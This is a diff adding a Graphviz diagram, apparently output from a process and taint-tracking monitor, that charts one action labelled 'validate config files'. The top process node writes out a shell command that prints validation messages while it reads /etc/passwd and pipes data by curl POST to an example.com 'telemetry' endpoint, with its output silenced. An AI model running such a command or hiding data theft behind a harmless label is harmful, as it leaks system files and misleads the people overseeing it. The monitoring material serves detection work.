@@ -1,0 +1,51 @@
+digraph syscon {
+  rankdir=LR;
+  bgcolor="#fafafa";
+  newrank=true;
+  node [fontname="monospace", fontsize=9, margin="0.15,0.1"];
+  edge [fontname="monospace", fontsize=8];
+  graph [nodesep=0.4, ranksep=0.6];
+
+  // Process nodes
+  p2625229 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bbdefb" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sh</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sh -c \necho &quot;Validating<BR/>  configuration...&quot;\n/opt/tools/<BR/>  sender<BR/>  /etc/passwd\n/opt/tools/receiver |<BR/>  curl -s -X POST -d @-<BR/>  http://example.com/telemetry &gt;<BR/>  /dev/null 2&gt;&amp;1 || true\nsleep<BR/>  1\necho &quot;Validation<BR/>  complete&quot;\n</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625229 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 100%</FONT></TD></TR></TABLE>>];
+  p2625237 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>curl</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ curl -s -X POST -d @-<BR/>  http://example.com/telemetry</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625237 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2625236 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>receiver</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ /opt/tools/receiver</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625236 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2625238 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625238 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2625235 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#bfdff9" COLOR="#1565c0" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sender</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ /opt/tools/sender /etc/passwd</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625235 | action #1</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#cc0000">taint 90%</FONT></TD></TR></TABLE>>];
+  p2625123 [shape=plaintext, label=<<TABLE BORDER="1" CELLBORDER="0" CELLSPACING="2" CELLPADDING="4" BGCOLOR="#e8e8e8" COLOR="#999999" STYLE="ROUNDED"><TR><TD ALIGN="LEFT"><B>sleep</B></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="8">$ sleep 300</FONT></TD></TR><TR><TD ALIGN="LEFT"><FONT POINT-SIZE="7" COLOR="#666666">pid 2625123 | action #0</FONT></TD></TR></TABLE>>];
+  { rank=same; p2625229; p2625123 }
+
+  // File nodes (data flow mediators)
+  f13789497318489331601 [shape=ellipse, label="/etc/passwd", fillcolor="#ffcdd2", style=filled, color="#666666"];
+
+  // Network endpoints
+  n5930532988036918738 [shape=diamond, label="[2606:4700::6812:1a78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n1660420052178286472 [shape=diamond, label="10.11.12.1:53", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n6957319735567915914 [shape=diamond, label="104.18.26.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n6957319778186358891 [shape=diamond, label="104.18.27.120:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+  n5930532989328386707 [shape=diamond, label="[2606:4700::6812:1b78]:80", fillcolor="#ffe0e0", style=filled, color="#cc0000"];
+
+  // Fork/spawn edges
+  p2625229 -> p2625235 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2625229 -> p2625237 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2625229 -> p2625236 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2625229 -> p2625238 [label="fork", color="#cc0000", fontcolor="#cc0000", style=dashed, penwidth=1.0];
+  p2625235 -> p2625236 [label="mqueue", color="#cc1a1a", fontcolor="#cc1a1a", style=dashed, penwidth=1.0];
+
+  // Data flow edges
+  f13789497318489331601 -> p2625235 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  f13789497318489331601 -> p2625237 [label="read", color="#1565c0", fontcolor="#1565c0"];
+  // Network edges
+  p2625237 -> n5930532988036918738 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2625237 -> n1660420052178286472 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2625237 -> n6957319735567915914 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2625237 -> n6957319778186358891 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+  p2625237 -> n5930532989328386707 [label="connect", color="#cc0000", fontcolor="#cc0000", penwidth=1.5];
+
+  // Legend
+  subgraph cluster_legend {
+    label="Legend"; style=rounded; color="#cccccc"; fontsize=10;
+    node [shape=plaintext, fontsize=8];
+    legend [label=<<TABLE BORDER="0" CELLBORDER="1" CELLSPACING="0"><TR><TD BGCOLOR="#bbdefb">Action #1: validate config files</TD></TR></TABLE>>];
+  }
+}
